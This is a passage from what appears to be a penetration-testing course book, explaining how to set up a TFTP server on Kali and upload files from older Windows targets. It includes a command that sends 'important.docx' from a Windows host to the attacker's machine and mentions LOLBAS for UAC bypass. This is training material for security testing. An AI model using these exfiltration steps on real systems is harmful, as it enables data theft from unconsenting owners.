![](bbox=[0.13, 0.03, 0.28, 0.09])

# **16.2.5 Uploading Files with TFTP**

While the Windows-based file transfer methods shown above work on all Windows versions since Windows 7 and Windows Server 2008 R2, we may run into problems when encountering older operating systems. PowerShell, while very powerful and often-used, is not installed by default on operating systems like Windows XP and Windows Server 2003, which are still found in some production networks. While both VBScript and the FTP client are present and will work, in this section we will discuss another file transfer method that may be effective in the field.

TFTP⁴⁰⁰ is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.

During a penetration test, we can use TFTP to transfer files from older Windows operating systems up to Windows XP and 2003. This is a terrific tool for non-interactive file transfer, but it is not installed by default on systems running Windows 7, Windows 2008, and newer.

For these reasons, TFTP is not an ideal file transfer protocol for most situations, but under the right circumstances, it has its advantages.

Before we learn how to transfer files with TFTP, we first need to install and configure a TFTP server in Kali and create a directory to store and serve files. Next, we update the ownership of the directory so we can write files to it. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created **/tftp** directory:

```
kali@kali:~$ **sudo apt update && sudo apt install atftp**
kali@kali:~$ **sudo mkdir /tftp**
kali@kali:~$ **sudo chown nobody: /tftp**
kali@kali:~$ **sudo atftpd --daemon --port 69 /tftp**
```

On the Windows system, we will run the **tftp** client with **-i** to specify a binary image transfer, the IP address of our Kali system, the **put** command to initiate an upload, and finally the filename of the file to upload.

The final command is similar to the one shown below in Listing 495:

```
C:\Users\Offsec> **tftp -i 10.11.8.4 put important.docx**
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
```

> *For some incredibly interesting ways to use common Windows utilities for file operations, program execution, UAC bypass, and much more, see the Living Off The Land Binaries And Scripts (LOLBAS) project.⁴⁰¹ maintained by Oddvar Moe and several contributors, which aims to ‘document every binary, script, and*

⁴⁰⁰ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol
⁴⁰¹ (LOLBAS-Project, 2019), https://github.com/LOLBAS-Project/LOLBAS